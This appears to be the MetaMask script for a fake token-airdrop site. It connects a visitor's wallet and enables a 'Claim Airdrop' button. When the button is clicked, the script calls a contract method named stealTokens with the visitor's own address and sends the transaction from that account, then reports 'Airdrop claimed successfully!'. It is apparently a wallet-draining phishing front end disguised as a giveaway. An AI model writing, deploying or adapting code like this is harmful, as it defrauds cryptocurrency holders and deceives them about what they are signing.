// metamask.js: Handles MetaMask-specific logic

let web3;
let accounts = [];
let isConnected = false; // Tracks MetaMask connection status

// Function to connect to MetaMask
async function connectMetaMask() {
    if (isConnected) return; // Prevent reconnect attempts

    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            console.log("Connected accounts:", accounts);

            // Update connection status
            isConnected = true;
            
            // Notify `common.js` about the connection
            onWalletConnected(accounts);

            // Enable claim button and disable connect button
            document.getElementById('claimAirdropButton').disabled = false;
            document.getElementById('connectButton').disabled = true;
        } catch (error) {
            console.error('MetaMask connection error:', error);
            alert('Failed to connect to MetaMask. Please try again.');
        }
    } else {
        alert("MetaMask is not installed. Please install MetaMask to use this application.");
    }
}

// Function to claim the airdrop
async function claimAirdrop(contractABI, contractAddress) {
    if (!isConnected || accounts.length === 0) {
        alert('Please connect to MetaMask first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details are missing. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        console.log('Sending transaction to claim tokens...');
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        console.error('Error claiming airdrop:', error);
        alert('Failed to claim airdrop. Please try again later.');
    }
}

// Event listeners for buttons
window.addEventListener('DOMContentLoaded', () => {
    // Attach event listeners to buttons
    const connectButton = document.getElementById('connectButton');
    const claimAirdropButton = document.getElementById('claimAirdropButton');

    if (connectButton) {
        connectButton.addEventListener('click', connectMetaMask);
    }

    if (claimAirdropButton) {
        claimAirdropButton.addEventListener('click', async () => {
            // Load ABI and contract address from `common.js`
            const { abi, address } = getContractDetails();
            await claimAirdrop(abi, address);
        });
    }
});


